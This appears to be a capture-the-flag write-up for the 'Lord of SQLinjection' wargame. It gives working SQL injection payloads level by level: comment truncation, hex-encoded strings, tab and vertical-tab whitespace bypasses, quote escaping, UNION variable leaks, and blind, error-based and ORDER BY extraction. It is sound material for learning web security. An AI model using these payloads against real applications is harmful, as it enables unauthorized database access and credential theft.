# Lord of SQLinjection

**Id = krxlol**  
**Pw = 123456789**

---

## 1. Gremlin

The task was to make the quesry true  

give a true condition and comment out the rest  

**query :**
```
select id from prob_gremlin where id='hello'OR 1=1--' and pw='00'
```

(PICTURE)

---

## 2. Cobolt

id was given as admin  

since password was unknow we comment out the rest  

**query :**
```
select id from prob_cobolt where id='admin'-- -' and pw=md5('')
```

(PICTURE)

---

## 3. Goblin

since quotes canot be used it was found that hex can be kept since it is interpreted as 'admin'

**query :**
```
select id from prob_goblin where id='guest' and no=0 or id=0x61646d696e
```

(PICTURE)

---

## 4. Orc

find the length of the password using  

**query :**
```
select id from prob_orc where id='admin' and pw='' or id="admin"and length(pw)=8-- -'
```

**query :**
```
select id from prob_orc where id='admin' and pw='095a9852'
```

(PICTURE)

---

## 5. Wolfman

It forbade whitespace, so we used url encoded tab (%09)

```
https://los.rubiya.kr/chall/wolfman_4fdc56b75971e41981e3d1e2fbe9b7f7.php?pw=%27%09or%09id%09=%27admin%27--%09-
```

**query :**
```
select id from prob_wolfman where id='guest' and pw='' or id ='admin'-- -'
```

(PICTURE)

---

## 6. Darkelf

And = &&  
Or = ||  
Not = !

**query :**
```
select id from prob_darkelf where id='guest' and pw=''||id='admin' -- -'
```

(PICTURE)

---

## 7. Orge

The && symbol doesn't work in a Uniform Resource Locator (URL) since it is a reserve character (%26)

**query :**
```
select id from prob_orge where id='guest' and pw='7b751aec'
```

(PICTURE)

---

## 8. Troll

Sql is not case senstitive  

**query :**
```
select id from prob_troll where id='Admin'
```

(PICTURE)

---

## 9. Vampire

This level replaces admin with “”  
we hide admin wich is separated by an admin in between them  

```
aadmindmin
```

```
https://los.rubiya.kr/chall/vampire_e3f1ef853da067db37f342f3a1881156.php?id=adadminmin
```

**query :**
```
select id from prob_vampire where id='admin'
```

(PICTURE)

---

## 10. Skelton

**query :**
```
select id from prob_skeleton where id='guest' and pw='' || id='admin'-- -' and 1=0
```

nothing much

(PICTURE)

---

## 11. Golem

Since “=” was blocked we have to use “LIKE”

**query :**
```
select id from prob_golem where id='guest' and pw='' || id LIKE 'admin' && length(pw) LIKE 8-- -'
```

length is 8  

**query :**
```
select id from prob_golem where id='guest' and pw='' || id LIKE 'admin' && substring(pw, 1, 1) LIKE '1' -- -'
```

(PICTURE)

---

## 12. Darknight

It prohibits the usage of “ ‘ ” we bypass it by using the hex of admin (0x61646d696e )

**query :**
```
select id from prob_darkknight where id='guest' and pw='' and no=1|| id LIKE 0x61646d696e
```

**query :**
```
select id from prob_darkknight where id='guest' and pw='' and no=0 OR id LIKE 0x61646d696e AND length(pw) LIKE 8
```

pw len is 8 (as usual)

substr is blocked so mid is used

**query :**
```
select id from prob_darkknight where id='guest' and pw='0b70ea1f' and no=
```

(PICTURE)

---

## 13. BugBear

Since space is blocked we use tab(%09)

```
https://los.rubiya.kr/chall/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php?no=0||id%09IN(%22admin%22)%26%26mid(pw,4,1)IN(%22c%22)
```

**query :**
```
select id from prob_bugbear where id='guest' and pw='' and no=0||id IN("admin")&&mid(pw,4,1)IN("c")
```

password: **52dc3991**

(PICTURE)

---

## 14. Giant

Since Space and Tab was prohibited we try other possibility  

Vertical tab (%0B) worked

```
https://los.rubiya.kr/chall/giant_18a08c3be1d1753de0cb157703f75a5e.php?shit=%0B
```

(PICTURE)

---

## 15. Assasin

In SQL, the percent sign (%) is the wildcard character used to represent zero, one, or multiple characters in a string search

```
https://los.rubiya.kr/chall/assassin_14a1fd552c61c60f034879e5d4171373.php?pw=902%
```

**query :**
```
select id from prob_assassin where pw like '902%'
```

(PICTURE)

---

## 16. Scubbus

“\” escapes the following character which was the closing single quote.

The \' effectively turns the closing quote into a literal character rather than a string terminator.

The entire middle section—' AND pw='—becomes the content of the id field.

The SQL engine keeps looking for the next unescaped single quote to end the string.

**query :**
```
select id from prob_succubus where id='0&?id=\' and pw=' OR 1=1 -- -'
```

(PICTURE)

---

## 17. Zombie_assassin

```
?id="&pw=- -- 1=1 RO
```

Trial and error

**query :**
```
select id from prob_zombie_assassin where id='"\' and pw='or 1=1 -- -'\ '
```

(PICTURE)

---

## 19. XAVIS

**query :**
```
select id from prob_xavis where id='admin' and pw=''||id='admin' and length(pw) =12-- -'
```

length of password is 12  

fetches the admin password  
stores it in a SQL variable  
using union we print it out  

```
?pw=' or (SELECT @ad:=pw WHERE id='admin') UNION SELECT @ad -- -
```

```
우왕굳
```

(PICTURE)

---

## 20. Dragon

It shows # which is used to comment out the line so we start a new line  

%0A is for New Line / Line Break (\n)

**query :**
```
select id from prob_dragon where id='guest'# and pw='' AND pw='1110' OR id='admin'-- -'
```

(PICTURE)

---

## 21. Iron_golem

Since sleep and benchmark are filtered, this is an Error-Based SQL Injection challenge.

**query :**
```
select id from prob_iron_golem where id='admin' and pw='' OR IF(length(pw)>32, (select 1 union select 2), 1) -- -'
```

It intentionally creates a multi-row response  

**query :**
```
select id from prob_iron_golem where id='admin' and pw=' OR IF(substr(pw,1,1)=9, (select 1 union select 2), 1) -- -'
```

(PICTURE)

---

## 22. Dark_eyes

Since the page exits when the error message comes we can exploit that  

Instead of using if we use where  

**query :**
```
select id from prob_dark_eyes where id='admin' and pw='' OR (SELECT 1 UNION SELECT 2 WHERE id='admin' AND length(pw)=8) -- -'
```

**query :**
```
select id from prob_dark_eyes where id='admin' and pw='' OR (SELECT 1 UNION SELECT 2 WHERE id='admin' AND substr(pw,1,1)=0) -- -'
```

(PICTURE)

---

## 23. Hell_fire

The ORDER BY keyword sorts the records in ascending order by default.

**query :**
```
select id,email,score from prob_hell_fire where 1 order by if(id='admin' AND length(email)=39, 1, 2)
```

(PICTURE)
